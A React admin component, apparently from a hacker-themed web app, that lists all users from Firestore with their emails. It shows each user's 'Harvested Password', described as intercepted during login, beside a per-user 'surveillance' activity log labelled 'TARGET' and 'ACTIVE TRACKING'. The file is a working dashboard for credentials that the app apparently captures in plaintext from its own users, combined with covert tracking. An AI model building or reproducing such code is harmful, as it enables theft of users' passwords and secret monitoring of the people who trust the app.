/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
*/
import React, { useEffect, useState } from 'react';
import { collection, query, orderBy, limit, onSnapshot, getDocs, where } from 'firebase/firestore';
import { db } from '../../lib/firebase';
import { ShieldAlert, Users, Database, Clock, Terminal, Search, Lock, Activity, Eye, Key, ChevronLeft, MousePointer2 } from 'lucide-react';

interface GlobalLog {
    id: string;
    msg: string;
    lvl: string;
    username: string;
    userId?: string;
    serverTime: any;
    ts: number;
    meta?: any;
}

interface UserData {
    id: string;
    username: string;
    email: string;
    role: string;
    messageCode: string;
    createdAt?: any;
    harvestedCreds?: string; // The captured password
    lastLogin?: any;
}

export const AdminApp: React.FC = () => {
    const [view, setView] = useState<'logs' | 'database'>('logs');
    const [logs, setLogs] = useState<GlobalLog[]>([]);
    const [users, setUsers] = useState<UserData[]>([]);
    const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
    const [userLogs, setUserLogs] = useState<GlobalLog[]>([]);
    const [loading, setLoading] = useState(true);

    // Global Logs Subscription
    useEffect(() => {
        const q = query(
            collection(db, 'system_logs'),
            orderBy('ts', 'desc'),
            limit(100)
        );

        const unsubscribe = onSnapshot(q, (snapshot) => {
            const fetchedLogs: GlobalLog[] = [];
            snapshot.forEach((doc) => {
                const data = doc.data();
                fetchedLogs.push({ id: doc.id, ...data } as GlobalLog);
            });
            setLogs(fetchedLogs);
            setLoading(false);
        });

        return () => unsubscribe();
    }, []);

    // Fetch All Users
    useEffect(() => {
        const fetchUsers = async () => {
             const q = query(collection(db, 'users'));
             const snap = await getDocs(q);
             const userList: UserData[] = [];
             snap.forEach(doc => {
                 userList.push({ id: doc.id, ...doc.data() } as UserData);
             });
             setUsers(userList);
        };
        fetchUsers();
    }, [view]);

    // Fetch Specific User Logs when selected
    useEffect(() => {
        if (!selectedUser) return;
        
        // We filter the client-side logs for immediate feedback, 
        // but in a real app we'd query Firestore for specific user logs
        // Here we just re-use the global stream + fetch history
        const fetchUserHistory = async () => {
            const q = query(
                collection(db, 'system_logs'), 
                where('userId', '==', selectedUser.id),
                orderBy('ts', 'desc'),
                limit(50)
            );
            const snap = await getDocs(q);
            const history: GlobalLog[] = [];
            snap.forEach(doc => {
                history.push({ id: doc.id, ...doc.data() } as GlobalLog);
            });
            setUserLogs(history);
        };
        fetchUserHistory();
    }, [selectedUser]);

    return (
        <div className="h-full w-full bg-black text-red-500 font-mono flex flex-col border-4 border-red-900/50">
            {/* Admin Header */}
            <div className="bg-red-950/30 border-b border-red-900 p-4 flex items-center justify-between shrink-0">
                <div className="flex items-center gap-3">
                    <ShieldAlert size={24} className="animate-pulse" />
                    <div>
                        <h1 className="text-xl font-bold tracking-widest text-red-500">GOD MODE // ADMIN</h1>
                        <p className="text-[10px] text-red-400/50 uppercase">Global Oversight System</p>
                    </div>
                </div>
                <div className="flex gap-2 text-xs font-bold">
                     <button 
                        onClick={() => { setView('logs'); setSelectedUser(null); }}
                        className={`flex items-center gap-2 px-3 py-1 rounded border transition-colors ${view === 'logs' ? 'bg-red-900 text-white border-red-500' : 'bg-black/50 border-red-900 hover:bg-red-900/30'}`}
                    >
                        <Activity size={14} /> SYSTEM LOGS
                    </button>
                    <button 
                        onClick={() => { setView('database'); setSelectedUser(null); }}
                        className={`flex items-center gap-2 px-3 py-1 rounded border transition-colors ${view === 'database' ? 'bg-red-900 text-white border-red-500' : 'bg-black/50 border-red-900 hover:bg-red-900/30'}`}
                    >
                        <Database size={14} /> USER DB
                    </button>
                </div>
            </div>

            {/* Content Area */}
            <div className="flex-1 overflow-hidden flex flex-col relative">
                {loading && <div className="absolute inset-0 flex items-center justify-center bg-black/80 z-20 text-red-500 animate-pulse">ESTABLISHING ROOT UPLINK...</div>}
                
                {view === 'logs' ? (
                    <>
                        <div className="grid grid-cols-12 gap-2 px-4 py-2 border-b border-red-900/30 text-[10px] uppercase text-red-700 font-bold bg-black shrink-0">
                            <div className="col-span-2">Timestamp</div>
                            <div className="col-span-2">Operative</div>
                            <div className="col-span-1">Level</div>
                            <div className="col-span-7">Action Payload</div>
                        </div>

                        <div className="flex-1 overflow-y-auto p-4 space-y-1 scrollbar-thin scrollbar-thumb-red-900 scrollbar-track-black">
                            {logs.map((log) => (
                                <div key={log.id} className="grid grid-cols-12 gap-2 text-xs border-b border-red-900/10 pb-1 hover:bg-red-900/10 transition-colors font-mono">
                                    <div className="col-span-2 opacity-50 flex items-center gap-1">
                                        <Clock size={10} />
                                        {new Date(log.ts).toLocaleTimeString()}
                                    </div>
                                    <div className="col-span-2 font-bold text-white truncate">
                                        {log.username}
                                    </div>
                                    <div className={`col-span-1 font-bold uppercase ${
                                        log.lvl === 'error' ? 'text-red-500' :
                                        log.lvl === 'surveillance' ? 'text-purple-400' :
                                        log.lvl === 'interaction' ? 'text-blue-400' :
                                        log.lvl === 'warning' ? 'text-yellow-500' :
                                        'text-green-500'
                                    }`}>
                                        {log.lvl}
                                    </div>
                                    <div className="col-span-7 text-red-200 truncate font-mono">
                                        <span className="opacity-50 mr-2">&gt;</span>{log.msg}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </>
                ) : selectedUser ? (
                    /* INDIVIDUAL TARGET INSPECTOR */
                    <div className="flex-1 flex flex-col bg-red-950/10">
                        <div className="p-4 border-b border-red-900/30 flex items-center gap-4 bg-black/40">
                            <button onClick={() => setSelectedUser(null)} className="p-2 hover:bg-red-900/20 rounded text-red-500">
                                <ChevronLeft size={20} />
                            </button>
                            <div className="flex-1">
                                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                                    <Users size={20} className="text-red-500" /> 
                                    TARGET: {selectedUser.username.toUpperCase()}
                                </h2>
                                <div className="text-xs text-red-400 font-mono">ID: {selectedUser.id}</div>
                            </div>
                            <div className="text-right">
                                <div className="text-xs text-red-500 uppercase font-bold">Status</div>
                                <div className="text-emerald-500 font-bold">ACTIVE TRACKING</div>
                            </div>
                        </div>

                        <div className="flex-1 overflow-y-auto p-6">
                            <div className="grid grid-cols-2 gap-6 mb-8">
                                {/* CREDENTIAL HARVESTER CARD */}
                                <div className="bg-black border border-red-500/30 p-4 rounded-lg relative overflow-hidden group">
                                    <div className="absolute top-0 right-0 p-2 opacity-20 group-hover:opacity-50 transition-opacity">
                                        <Key size={48} />
                                    </div>
                                    <h3 className="text-sm font-bold text-red-500 uppercase tracking-widest mb-4 border-b border-red-900/50 pb-2">
                                        Decrypted Credentials
                                    </h3>
                                    <div className="space-y-4">
                                        <div>
                                            <label className="text-[10px] text-red-400 uppercase">Login Email</label>
                                            <div className="text-white font-mono">{selectedUser.email}</div>
                                        </div>
                                        <div>
                                            <label className="text-[10px] text-red-400 uppercase">Harvested Password</label>
                                            <div className="text-2xl font-mono text-white bg-red-900/20 p-2 rounded border border-red-500/30 flex items-center gap-3">
                                                <span className="text-red-500 select-none">PASS:</span>
                                                {selectedUser.harvestedCreds || 'NO_DATA_CAPTURED'}
                                            </div>
                                            <div className="text-[10px] text-red-500 mt-1 animate-pulse">
                                                * This data was intercepted during login.
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                {/* META DATA CARD */}
                                <div className="bg-black border border-red-900/30 p-4 rounded-lg">
                                    <h3 className="text-sm font-bold text-red-700 uppercase tracking-widest mb-4 border-b border-red-900/50 pb-2">
                                        Metadata
                                    </h3>
                                    <div className="space-y-2 text-xs font-mono text-red-300">
                                        <div className="flex justify-between">
                                            <span>Role:</span>
                                            <span className="text-white">{selectedUser.role}</span>
                                        </div>
                                        <div className="flex justify-between">
                                            <span>Internal Code:</span>
                                            <span className="text-white">{selectedUser.messageCode}</span>
                                        </div>
                                        <div className="flex justify-between">
                                            <span>Account Created:</span>
                                            <span className="text-white">{selectedUser.createdAt?.toDate ? selectedUser.createdAt.toDate().toLocaleString() : 'Unknown'}</span>
                                        </div>
                                        <div className="flex justify-between">
                                            <span>Last Active:</span>
                                            <span className="text-white">{selectedUser.lastLogin?.toDate ? selectedUser.lastLogin.toDate().toLocaleString() : 'Now'}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <h3 className="text-sm font-bold text-red-500 uppercase tracking-widest mb-2 flex items-center gap-2">
                                <Activity size={16} /> Targeted Activity Log
                            </h3>
                            <div className="bg-black border border-red-900/30 rounded-lg overflow-hidden">
                                {userLogs.length === 0 ? (
                                    <div className="p-4 text-center text-red-900 text-xs">No activity recorded for this target.</div>
                                ) : (
                                    userLogs.map((log, idx) => (
                                        <div key={idx} className="border-b border-red-900/10 p-2 text-xs hover:bg-red-900/5 flex gap-3 font-mono">
                                            <span className="text-red-600 w-20 shrink-0">{new Date(log.ts).toLocaleTimeString()}</span>
                                            <span className={`uppercase font-bold w-24 shrink-0 ${
                                                log.lvl === 'interaction' ? 'text-blue-500' : 'text-red-400'
                                            }`}>{log.lvl}</span>
                                            <span className="text-red-200">{log.msg}</span>
                                        </div>
                                    ))
                                )}
                            </div>
                        </div>
                    </div>
                ) : (
                    /* DATABASE LIST VIEW */
                    <>
                         <div className="grid grid-cols-12 gap-2 px-4 py-2 border-b border-red-900/30 text-[10px] uppercase text-red-700 font-bold bg-black shrink-0">
                            <div className="col-span-3">ID / Code</div>
                            <div className="col-span-3">Username</div>
                            <div className="col-span-3">Email</div>
                            <div className="col-span-3">Status</div>
                        </div>
                        <div className="flex-1 overflow-y-auto p-4 space-y-1 scrollbar-thin scrollbar-thumb-red-900 scrollbar-track-black">
                            {users.map(user => (
                                <div 
                                    key={user.id} 
                                    onClick={() => setSelectedUser(user)}
                                    className="grid grid-cols-12 gap-2 text-xs border-b border-red-900/10 pb-2 hover:bg-red-900/20 cursor-pointer transition-colors items-center group"
                                >
                                    <div className="col-span-3 font-mono text-red-400 group-hover:text-white">
                                        {user.messageCode}
                                        <div className="text-[9px] opacity-40">{user.id.substring(0,8)}...</div>
                                    </div>
                                    <div className="col-span-3 font-bold text-white">
                                        {user.username}
                                    </div>
                                     <div className="col-span-3 opacity-70 truncate text-red-200">
                                        {user.email}
                                    </div>
                                    <div className="col-span-3 flex items-center gap-2">
                                        {user.role === 'admin' ? <ShieldAlert size={12} className="text-yellow-500" /> : <Users size={12} className="text-red-600" />}
                                        <span className={user.role === 'admin' ? 'text-yellow-500 font-bold' : 'text-red-500'}>{user.role || 'Operative'}</span>
                                        <Eye size={12} className="ml-auto opacity-0 group-hover:opacity-100 text-red-500" />
                                    </div>
                                </div>
                            ))}
                        </div>
                    </>
                )}
            </div>

            {/* Command Footer */}
            <div className="p-2 border-t border-red-900 bg-black flex items-center gap-2 text-xs shrink-0">
                <Terminal size={14} className="text-red-600" />
                <span className="text-red-700">ROOT@MICROVERSE:~#</span>
                <span className="text-red-500">tail -f /var/log/surveillance.log</span>
                <span className="animate-pulse text-red-500">_</span>
            </div>
        </div>
    );
};